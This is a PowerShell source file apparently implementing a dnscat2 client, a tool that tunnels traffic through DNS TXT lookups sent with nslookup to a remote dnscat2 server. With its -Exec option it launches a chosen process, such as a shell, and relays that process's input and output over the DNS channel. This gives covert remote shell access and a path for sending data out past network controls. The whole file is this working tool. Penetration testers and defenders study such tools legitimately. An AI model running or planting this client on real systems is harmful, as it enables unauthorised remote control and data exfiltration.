function dnscat2
{
  param(
    [string]$DNSServer="",
    [alias("p")][ValidateRange(1,65535)][int32]$DNSPort=53,
    [alias("dns")][string]$Domain="",
    [alias("e")][string]$Exec="",
    [alias("h")][switch]$Help=$False
  )
    
  if($Help)
  {
    "
dnscat2: Powershell Version
    
-Domain <domain>          The domain of the dnscat2 server
-DNSServer <host>         The DNS Server [default: Windows default]
-DNSPort -p <port>        The DNS port [default: 53]
-Exec -e <process>        Execute the given process
-Help -h                  Display this help message
"
    break
  }
  
  $Tag = "dnscat."
  if($Domain -ne "")
  {
    Write-Verbose "No Domain provided, $DNSServer probably needs to be the dnscat2 server."
    $Tag = ""
    $Domain = ("." + $Domain)
  }
  
  function ConvertTo-HexArray
  {
    param($String)
    $Hex = @()
    $String.ToCharArray() | % {"{0:x}" -f [byte]$_} | % {if($_.Length -eq 1){"0" + [string]$_} else{[string]$_}} | % {$Hex += $_}
    return $Hex
  }
  
  function SendPacket
  {
    param($Packet)
    $Command = ("set type=TXT`nserver $DNSServer`nset port=$DNSPort`nset domain=.com`nset retry=1`n" + $Packet + "`nexit")
    $result = ($Command | nslookup 2>&1 | Out-String)
    if($result.Contains('"')){return ([regex]::Match($result.replace("bio=",""),'(?<=")[^"]*(?=")').Value)}
    else{return 1}
  }
  
  function Generate_Random { return ([string](Get-Random -Maximum 9999 -Minimum 1000)) }
  
  function CreatePacket_SYN
  {
    param(
      $SessionId,
      $SequenceNumber,
      $Options
    )
    return ($Tag + (Generate_Random) + "00" + $SessionId + $SequenceNumber + "0000" + $Domain)
  }
  
  function CreatePacket_FIN
  {
    param($SessionId)
    return ($Tag + (Generate_Random) + "02" + $SessionId + "00" + $Domain)
  }
  
  function CreatePacket_MSG
  {
    param(
      $SessionId,
      $SequenceNumber,
      $AcknowledgementNumber,
      $Data
    )
    return ($Tag + (Generate_Random) + "01" + $SessionId + $SequenceNumber + $AcknowledgementNumber + $Data + $Domain)
  }
  
  function DecodePacket
  {
    param($Packet)
    
    if((($Packet.Length)%2 -eq 1) -or ($Packet.Length -eq 0)){return 1}
    $AcknowledgementNumber = ($Packet[10..13] -join "")
    $SequenceNumber = ($Packet[14..17] -join "")
    $ReturningData = ""
    
    if($Packet.Length -gt 18)
    {
      $PacketElim = $Packet.Substring(18)
      while($PacketElim.Length -gt 0)
      {
        $ReturningData += [string][char][Convert]::ToInt16(($PacketElim[0..1] -join ""),16)
        $PacketElim = $PacketElim.Substring(2)
      }
    }
    
    return $Packet,$ReturningData,$AcknowledgementNumber,$SequenceNumber
  }
  
  function AcknowledgeData
  {
    param(
      $ReturningData,
      $AcknowledgementNumber
    )
    $Hex = [string]("{0:x}" -f (([uint16]("0x" + $AcknowledgementNumber) + $ReturningData.Length) % 65535))
    if($Hex.Length -ne 4){$Hex = (("0"*(4-$Hex.Length)) + $Hex)}
    return $Hex
  }

  if($Exec -eq "")
  {
    $StdOutReadOperation = $null
    $StdOutDestinationBuffer = $null
    $StdErrReadOperation = $null
    $StdErrDestinationBuffer = $null
    function GetInputData
    {
      param($StdOutReadOperation,$StdOutDestinationBuffer,$StdErrReadOperation,$StdErrDestinationBuffer)
      $InputData = ""
      if($Host.UI.RawUI.KeyAvailable)
      {
        $InputData = ((Read-Host) + "`n")
      }
      return $InputData,$StdOutReadOperation,$StdOutDestinationBuffer,$StdErrReadOperation,$StdErrDestinationBuffer
    }
    function WriteOutput
    {
      param($Data)
      Write-Host -n $Data
    }
  }
  else
  {
    $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
    $ProcessStartInfo.FileName = $Exec
    $ProcessStartInfo.UseShellExecute = $False
    $ProcessStartInfo.RedirectStandardInput = $True
    $ProcessStartInfo.RedirectStandardOutput = $True
    $ProcessStartInfo.RedirectStandardError = $True
    $Process = [System.Diagnostics.Process]::Start($ProcessStartInfo)
    $Process.Start() | Out-Null
    $StdOutDestinationBuffer = New-Object System.Byte[] 65536
    $StdOutReadOperation = $Process.StandardOutput.BaseStream.BeginRead($StdOutDestinationBuffer, 0, 65536, $null, $null)
    $StdErrDestinationBuffer = New-Object System.Byte[] 65536
    $StdErrReadOperation = $Process.StandardError.BaseStream.BeginRead($StdErrDestinationBuffer, 0, 65536, $null, $null)
    $Encoding = New-Object System.Text.AsciiEncoding
    
    function GetInputData
    {
      param($StdOutReadOperation,$StdOutDestinationBuffer,$StdErrReadOperation,$StdErrDestinationBuffer)
      if($Host.UI.RawUI.KeyAvailable)
      {
        $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyUp") | Out-Null
      }
      $Data = ""
      if($StdOutReadOperation.IsCompleted)
      {
        $StdOutBytesRead = $Process.StandardOutput.BaseStream.EndRead($StdOutReadOperation)
        if($StdOutBytesRead -eq 0){break}
        $Data += $Encoding.GetString($StdOutDestinationBuffer[0..([int]$StdOutBytesRead-1)])
        $StdOutReadOperation = $Process.StandardOutput.BaseStream.BeginRead($StdOutDestinationBuffer, 0, 65536, $null, $null)
      }
      if($StdErrReadOperation.IsCompleted)
      {
        $StdErrBytesRead = $Process.StandardError.BaseStream.EndRead($StdErrReadOperation)
        if($StdErrBytesRead -eq 0){break}
        $Data += $Encoding.GetString($StdErrDestinationBuffer[0..([int]$StdErrBytesRead-1)])
        $StdErrReadOperation = $Process.StandardError.BaseStream.BeginRead($StdErrDestinationBuffer, 0, 65536, $null, $null)
      }
      return $Data,$StdOutReadOperation,$StdOutDestinationBuffer,$StdErrReadOperation,$StdErrDestinationBuffer
    }
    function WriteOutput
    {
      param($Data)
      $Process.StandardInput.WriteLine($Data.TrimEnd("`r").TrimEnd("`n"))
    }
  }
  
  $SessionId = Generate_Random
  $SequenceNumber = Generate_Random
  $DecodedPacket = DecodePacket (SendPacket (CreatePacket_SYN $SessionId $SequenceNumber $Options))
  if($DecodedPacket -eq 1){return "Bad SYN response. Ensure your server is set up correctly."}
  $ReturningData = $DecodedPacket[1]
  $AcknowledgementNumber = $DecodedPacket[2]
  $MaxMSGDataSize = (244 - (CreatePacket_MSG $SessionId $SequenceNumber $AcknowledgementNumber "").Length)
  if($MaxMSGDataSize -le 0){return "Domain name is too long."}
  
  try
  {
    while($True)
    {
      $InputData = GetInputData $StdOutReadOperation $StdOutDestinationBuffer $StdErrReadOperation $StdErrDestinationBuffer
      $StdOutReadOperation = $InputData[1]
      $StdOutDestinationBuffer = $InputData[2]
      $StdErrReadOperation = $InputData[3]
      $StdErrDestinationBuffer = $InputData[4]
      $InputData = $InputData[0]
      $PacketsData = @()
      $PacketData = ""
      
      if($InputData -ne "")
      {
        $Hex = ConvertTo-HexArray $InputData
        $SectionCount = 0
        $PacketCount = 0
        foreach($Char in $Hex)
        {
          if($SectionCount -ge 30)
          {
            $SectionCount = 0
            $PacketData += "."
          }
          if($PacketCount -ge ($MaxMSGDataSize))
          {
            $PacketsData += $PacketData.TrimEnd(".")
            $PacketCount = 0
            $SectionCount = 0
            $PacketData = ""
          }
          $PacketData += $Char
          $SectionCount += 2
          $PacketCount += 2
        }
        $PacketData = $PacketData.TrimEnd(".")
        $PacketsData += $PacketData
      }
      else
      {
        $PacketsData = @("")
      }
      
      $ReturningData = ""
      foreach($PacketData in $PacketsData)
      {
        try{$Packet = (SendPacket (CreatePacket_MSG $SessionId $SequenceNumber $AcknowledgementNumber $PacketData))}
        catch{ Write-Host "HOST: Failed to send packet." }
        try
        {
          $DecodedPacket = (DecodePacket $Packet)
          if($DecodedPacket.Length -ne 4){ Write-Host "HOST: Failure to decode packet, dropping..."; continue }
          $AcknowledgementNumber = $DecodedPacket[2]
          $SequenceNumber = $DecodedPacket[3]
          $ReturningData += $DecodedPacket[1]
        }
        catch{ Write-Verbose "HOST: Failure to decode packet, dropping..." }
        if($DecodedPacket -eq 1){ Write-Verbose "HOST: Failure to decode packet, dropping..." }
      }
      
      if($ReturningData -ne "")
      {
        $AcknowledgementNumber = AcknowledgeData $ReturningData $AcknowledgementNumber
        WriteOutput $ReturningData
        if ($ReturningData -like "*killed: *") { exit }
      }
    }
  }
  finally
  {
    SendPacket (CreatePacket_FIN $SessionId $Domain) | Out-Null
    if($Process -ne $null){$Process | Stop-Process}
  }
}
